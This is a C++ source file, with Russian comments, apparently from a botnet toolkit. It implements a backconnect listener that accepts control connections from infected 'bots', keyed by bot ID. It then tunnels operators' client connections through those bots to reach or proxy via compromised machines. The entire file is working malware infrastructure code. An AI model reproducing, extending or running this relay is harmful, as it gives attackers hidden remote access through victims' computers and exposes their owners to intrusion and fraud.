#include <windows.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "language.h"
#include "core.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\wsocket.h"
#include "..\common\crypt.h"
#include "..\common\console.h"
#include "..\common\threadsgroup.h"
#include "..\common\backconnect.h"
#include "..\common\cui.h"

//Максимальное время ожидания подключения сервиса бота на локальный порт в миллесекундах.
#define BCWAIT_TIMEOUT (10 * 60000)

typedef struct
{
  SOCKET list[4]; //Сокеты в порядке ipv4 bot, ipv4 client, ipv6 bot, ipv6 client.
  BYTE count;    //Реальное количетсво окрытых портов.
}GENSOCKDATA;

static HANDLE eventQuit;

////////////////////////////////////////////////////////////////////////////////////////////////////
// Работа с таблицей хэнделов.
////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
  SOCKET client;         //Сокет клиента.
  SOCKET bot;            //Сокет бота.
  HANDLE connectedEvent; //Сигнал о подключении sBot.
  DWORD id;              //ID элемента.
}BCCCONNECT;

static DWORD nextBccId;
static BCCCONNECT *bccList;
static DWORD bccListCount;
static CRITICAL_SECTION csBccConnect;

/*
  Создание ресурсов для контнроля списка соединений.
*/
static void initBccConnect(void)
{
  nextBccId    = Crypt::mtRand();
  bccListCount = 0;
  bccList      = NULL;
  CWA(kernel32, InitializeCriticalSection)(&csBccConnect);
}

/*
  Освобождения ресурсов для контнроля списка соединений.
*/
static void uninitBccConnect(void)
{
  CWA(kernel32, DeleteCriticalSection)(&csBccConnect);
}

/*
  Поиск данных соединения.

  IN id - ID соединения.

  Return - данные соединения, или NULL - если оно не найдено.
*/
static BCCCONNECT *getBccConnect(DWORD id)
{
  if(id != 0)for(register DWORD i = 0; i < bccListCount; i++)if(bccList[i].id == id)return &bccList[i];
  return NULL; 
}

/*
  Добавление нового соединения в список.

  IN client - сокет для добавления.

  Return    - ID соединения, или 0 - в случаи ошибки.
*/
static DWORD addBccConnect(SOCKET client)
{
  CWA(kernel32, EnterCriticalSection)(&csBccConnect);
  
  BCCCONNECT *newConnect = NULL;

  //Обрезаем безполезную концовку.
  while(bccListCount > 0 && bccList[bccListCount - 1].id == 0)bccListCount--;
  
  for(DWORD i = 0; i < bccListCount; i++)if(bccList[i].id == 0)
  {
    newConnect = &bccList[i];
    break;
  }

  if(newConnect == NULL)
  {
    if(!Mem::reallocEx(&bccList, sizeof(BCCCONNECT) * (bccListCount + 1)))
    {
      CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
      return 0;
    }
    
    newConnect = &bccList[bccListCount];
    bccListCount++;
  }

  DWORD id = 0;

  newConnect->client = client;
  newConnect->bot    = INVALID_SOCKET;
  newConnect->connectedEvent = CWA(kernel32, CreateEventW)(NULL, TRUE, FALSE, NULL);
  newConnect->id = 0;
  
  if(newConnect->connectedEvent != NULL)
  {
    if(++nextBccId == 0)nextBccId++;
    id = newConnect->id = nextBccId;
  }

  CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
  return id;
}

/*
  Закрытие соединение и освобождение всех ресурсов.

  IN id - ID соединения.
*/
static void closeBccConnect(DWORD id)
{
  if(id != 0)
  {
    CWA(kernel32, EnterCriticalSection)(&csBccConnect);
    
    BCCCONNECT *bccConnect = NULL;
    DWORD i = 0;
    for(; i < bccListCount; i++)if(bccList[i].id == id)bccConnect = &bccList[i];
    
    if(bccConnect != NULL)
    {
      //см. freeBccConnect().
      WSocket::tcpClose(bccConnect->client);
      WSocket::tcpClose(bccConnect->bot);
      CWA(kernel32, CloseHandle)(bccConnect->connectedEvent);
      
      bccConnect->client         = INVALID_SOCKET;
      bccConnect->bot            = INVALID_SOCKET;
      bccConnect->connectedEvent = NULL;
      bccConnect->id             = 0;
      
      //Обрезаем конец.
      if(i + 1 == bccListCount)
      {
        if(--bccListCount == 0)
        {
          Mem::free(bccList);
          bccList = NULL;
        }
        else Mem::reallocEx(&bccList, sizeof(DWORD) * bccListCount);
      }
    }
    
    CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
  }
}

/*
  Тунель между клиентом и ботом

  IN p   - DWORD, ID соединения.

  Return - 0.
*/
static DWORD WINAPI sockTunnel(void *p)
{
  DWORD id = (DWORD_PTR)p;
  
  HANDLE events[2];
  
  //Получаем события.
  CWA(kernel32, EnterCriticalSection)(&csBccConnect);
  BCCCONNECT *bccConnect = getBccConnect(id);
  if(bccConnect != NULL)
  {
    events[0] = bccConnect->connectedEvent;
    events[1] = eventQuit;
  }
  CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
  
  //Ждем событий.
  if(bccConnect != NULL)
  {
    DWORD r = CWA(kernel32, WaitForMultipleObjects)(2, events, FALSE, BCWAIT_TIMEOUT);

    if(r == WAIT_OBJECT_0)
    {
      SOCKET s1, s2;

      CWA(kernel32, EnterCriticalSection)(&csBccConnect);
      BCCCONNECT *bccConnect = getBccConnect(id);
      if(bccConnect != NULL)
      {
        s1 = bccConnect->bot;
        s2 = bccConnect->client;
      }
      CWA(kernel32, LeaveCriticalSection)(&csBccConnect);

      if(bccConnect != NULL)
      {
        Console::writeFormatW(lng_listen_tunnel, id);
        WSocket::tcpTunnelAndWaitForWinEvent(s1, s2, eventQuit);
      }
      //else //На самом деле сюда не реально попасть я так думаю.
    }
    else if(r == WAIT_TIMEOUT)Console::writeFormatW(lng_listen_id_timeout, id);

    closeBccConnect(id);
  }

  return 0;
}

/*
  Прием соединений от клиентов и ботов.

  IN gsd - данные сокетов.
*/
static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
{
  SOCKADDR_STORAGE sa;
  WCHAR ipStr[MAX_PATH];                 //Текстовое представление IP.
  SOCKET botMainSocket = INVALID_SOCKET; //Управляющее соединение.
  ThreadsGroup::GROUP group;
  
  ThreadsGroup::_createGroup(&group);

  for(;;)
  {
    //FIXME: WSAEventSelect().
    SOCKET curSocket = WSocket::tcpWaitForEvent(gsd->list, gsd->count, 1000, NULL, 0);

    //Ошибка.
    if(curSocket == INVALID_SOCKET && CWA(ws2_32, WSAGetLastError)() != WSAETIMEDOUT)break;
    
    //Проверка сообшения о выходе.
    if(CWA(kernel32, WaitForSingleObject)(eventQuit, 0) != WAIT_TIMEOUT)break;
    
    //Таймаут.
    if(curSocket == INVALID_SOCKET)continue;

    //Получаем данные соединения.
    int saSize = sizeof(SOCKADDR_STORAGE);
    SOCKET acceptedSocket = CWA(ws2_32, accept)(curSocket, (sockaddr *)&sa, &saSize);
    if(acceptedSocket != INVALID_SOCKET)
    {
      WSocket::tcpDisableDelay(acceptedSocket, true);
      WSocket::tcpSetKeepAlive(acceptedSocket, true, Backconnect::KEEPALIVE_DELAY, Backconnect::KEEPALIVE_INTERVAL);
      WSocket::ipToStringW(&sa, ipStr);
    }
    
    //Сокеты для бота.
    for(BYTE i = 0; i < gsd->count; i += 2)if(curSocket == gsd->list[i])
    {
      if(acceptedSocket == INVALID_SOCKET)Console::writeStringW(lng_listen_error_accept_bot, sizeof(lng_listen_error_accept_bot) / sizeof(WCHAR) - 1);
      else
      {
        //Получаем команду.
        Backconnect::COMMAND command;
        LPSTR commandData = NULL;

        if(!Backconnect::_readCommand(acceptedSocket, &command, (LPBYTE *)&commandData))
        {
          Console::writeStringW(lng_listen_error_accept_bot, sizeof(lng_listen_error_accept_bot) / sizeof(WCHAR) - 1);
          WSocket::tcpClose(acceptedSocket);
          goto NEXT;
        }
        
        //Это основное соединение. Закрываем старое.
        if(command.command == Backconnect::COMMAND_BOTID)
        {
          WSocket::tcpClose(botMainSocket);
          botMainSocket = acceptedSocket;
          
          {
            LPWSTR botId = Str::_utf8ToUnicode(commandData, -1);
            Console::writeFormatW(lng_listen_accept_bot, botId ? botId : L"-", ipStr);
            Mem::free(botId);
          }
        }
        //Это сервисное соединение.
        else if(command.command == Backconnect::COMMAND_IS_SERVICE && command.dataSize == sizeof(DWORD))
        {
          CWA(kernel32, EnterCriticalSection)(&csBccConnect);
          BCCCONNECT *bccConnect = getBccConnect(*(LPDWORD)commandData);
          if(bccConnect == NULL)
          {
            WSocket::tcpClose(acceptedSocket);
            Console::writeFormatW(lng_listen_error_accept_bot_unknown_id, *(LPDWORD)commandData);
          }
          else
          {
            bccConnect->bot = acceptedSocket;
            CWA(kernel32, SetEvent)(bccConnect->connectedEvent);
          }
          CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
        }
        else
        {
          WSocket::tcpClose(acceptedSocket);
          Console::writeFormatW(lng_listen_error_accept_bot_unknown_command, command.command);
        }
        Mem::free(commandData);
      }
      goto NEXT;
    }
    
    //Сокеты для клиента.
    for(BYTE i = 1; i < gsd->count; i += 2)if(curSocket == gsd->list[i])
    {
      if(acceptedSocket == INVALID_SOCKET)Console::writeStringW(lng_listen_faccept_client, sizeof(lng_listen_faccept_client) / sizeof(WCHAR) - 1);
      //Если бот еше не подключен, отключаем клиента.
      else if(botMainSocket == INVALID_SOCKET)Console::writeFormatW(lng_listen_accept_bclient, ipStr);
      else
      {
        //Сохраняем клиентский сокет.
        DWORD id = addBccConnect(acceptedSocket);
        Console::writeFormatW(lng_listen_accept_client, ipStr, id);
        if(id > 0 && Backconnect::_writeCommand(botMainSocket, Backconnect::COMMAND_CONNECT, (LPBYTE)&id, sizeof(DWORD)))
        {
          if(!ThreadsGroup::_createThread(&group, 0, sockTunnel, (LPVOID)(DWORD_PTR)id, NULL, NULL))
          {
            Console::writeFormatW(lng_error_thread_failed, CWA(kernel32, GetLastError)());
            closeBccConnect(id);//Внутри уже есть WSocket::tcpClose(acceptedSocket)
          }
          ThreadsGroup::_closeTerminatedHandles(&group);
          goto NEXT;
        }
        else
        {
          Console::writeFormatW(lng_listen_error_socket, CWA(ws2_32, WSAGetLastError)());
          
          //Ошибка на управляющем сокете.
          if(id > 0)
          {
            WSocket::tcpClose(botMainSocket);
            botMainSocket = INVALID_SOCKET;
          }
        }
      }
      WSocket::tcpClose(acceptedSocket);
      goto NEXT;
    }

NEXT:;
  }
  
  Console::writeStringW(lng_listen_shutdown, sizeof(lng_listen_shutdown) / sizeof(WCHAR) - 1);
  
  WSocket::tcpClose(botMainSocket);  
  
  //Закрытие сервисных нитей.
  ThreadsGroup::_waitForAllExit(&group, INFINITE);
  ThreadsGroup::_closeGroup(&group);
}

/*
  Кэлбэк консоли, для остановки процесса.

  Return - TRUE.
*/
static BOOL WINAPI handlerRoutine(DWORD)
{
  CWA(kernel32, SetEvent)(eventQuit);
  return TRUE;
}

/*
  Создание листинга на IPv4.

  IN port - порт.

  Return  - хэндл сокета, или INVALID_SOCKET.
*/
static SOCKET listenPortIpv4(WORD port)
{
  SOCKADDR_IN si;
  Mem::_zero(&si, sizeof(SOCKADDR_IN));
  si.sin_family = AF_INET;
  si.sin_port   = SWAP_WORD(port);
  SOCKET s = WSocket::tcpListen((SOCKADDR_STORAGE *)&si, SOMAXCONN);
  Console::writeFormatW(s == INVALID_SOCKET ? lng_error_failed_port_ipv4 : lng_listen_port_ipv4, port);
  return s;
}

/*
  Создание листинга на IPv6.

  IN port - порт.

  Return  - хэндл сокета, или INVALID_SOCKET.
*/
static SOCKET listenPortIpv6(WORD port)
{
  SOCKADDR_IN6 si;
  Mem::_zero(&si, sizeof(SOCKADDR_IN6));
  si.sin6_family = AF_INET6;
  si.sin6_port   = SWAP_WORD(port);
  SOCKET s = WSocket::tcpListen((SOCKADDR_STORAGE *)&si, SOMAXCONN);
  Console::writeFormatW(s == INVALID_SOCKET ? lng_error_failed_port_ipv6 : lng_listen_port_ipv6, port);
  return s;
}

/*
  Точка входа.
*/
void commandListen(LPWSTR *switches, DWORD switchesCount)
{  
  DWORD botPort, clientPort;

  //Получение портов из командной строки.
  {
    LPWSTR botPortAsString = Cui::_getSwitchValue(switches, switchesCount, lng_switch_botport);
    LPWSTR clientPortAsString = Cui::_getSwitchValue(switches, switchesCount, lng_switch_clientport);

    if(botPortAsString <= (LPWSTR)1 || clientPortAsString <= (LPWSTR)1)
    {
      Console::writeStringW(lng_listen_no_ports, sizeof(lng_listen_no_ports) / sizeof(WCHAR) - 1);
      return;
    }
    
    botPort = Str::_ToInt32W(botPortAsString, NULL);
    clientPort = Str::_ToInt32W(clientPortAsString, NULL);
    if(botPort < 1 || botPort >= MAXWORD || clientPort < 1 || clientPort >= MAXWORD)
    {
      Console::writeStringW(lng_listen_no_ports, sizeof(lng_listen_no_ports) / sizeof(WCHAR) - 1);
      return;
    }
  }

  if(!WSocket::init())
  {
    Console::writeStringW(lng_error_wsocket_failed, sizeof(lng_error_wsocket_failed) / sizeof(WCHAR) - 1);
    coreData.exitCode = Cui::EXITCODE_ERROR_SOCKET; 
    return;
  }
  
  bool ipv4 = (Cui::_getSwitchValue(switches, switchesCount, lng_switch_ipv4) == (LPWSTR)1);
  bool ipv6 = (Cui::_getSwitchValue(switches, switchesCount, lng_switch_ipv6) == (LPWSTR)1);

  /*    
    Указание протокола по умолчанию.
    
    В далеком будущем, когда основным протоколом станет ipv6, необходимо заменить эту строку
    соответсвенно.
  */
  if(!ipv4 && !ipv6)ipv4 = true;
  
  //Создаем сокеты.
  GENSOCKDATA gsd;
  Mem::_zero(&gsd, sizeof(GENSOCKDATA));

  if(ipv4)
  {
    gsd.list[gsd.count + 0] = listenPortIpv4((WORD)botPort);
    gsd.list[gsd.count + 1] = listenPortIpv4((WORD)clientPort);

    gsd.count += 2;
  }
  
  if(ipv6)
  {
    gsd.list[gsd.count + 0] = listenPortIpv6((WORD)botPort);
    gsd.list[gsd.count + 1] = listenPortIpv6((WORD)clientPort);

    gsd.count += 2;
  }

  //Проверяем успешно ли созданы все сокеты.
  for(BYTE i = 0; i < gsd.count; i++)if(gsd.list[i] == INVALID_SOCKET)
  {
    coreData.exitCode = Cui::EXITCODE_ERROR_SOCKET;
    goto END;
  }
  
  if((eventQuit = CWA(kernel32, CreateEventW)(NULL, TRUE, FALSE, NULL)) == NULL ||
     !CWA(kernel32, SetConsoleCtrlHandler)(NULL, FALSE) || !CWA(kernel32, SetConsoleCtrlHandler)(handlerRoutine, TRUE)
    )
  {
    Console::writeStringW(lng_error_unknown, sizeof(lng_error_unknown) / sizeof(WCHAR) - 1);
    coreData.exitCode = Cui::EXITCODE_ERROR_UNKNOWN;
  }
  else
  {
    Console::writeFormatW(lng_listen_wait_incoming, botPort, clientPort);
    initBccConnect();
    acceptGeneralConnections(&gsd);
    uninitBccConnect();
    coreData.exitCode = Cui::EXITCODE_SUCCESSED;  
  }
  if(eventQuit != NULL)CWA(kernel32, CloseHandle)(eventQuit);

END:
  for(BYTE i = 0; i < gsd.count; i++)WSocket::tcpClose(gsd.list[i]);
  if(coreData.exitCode == Cui::EXITCODE_SUCCESSED)Console::writeStringW(lng_listen_ready, sizeof(lng_listen_ready) / sizeof(WCHAR) - 1);
  WSocket::uninit();
}
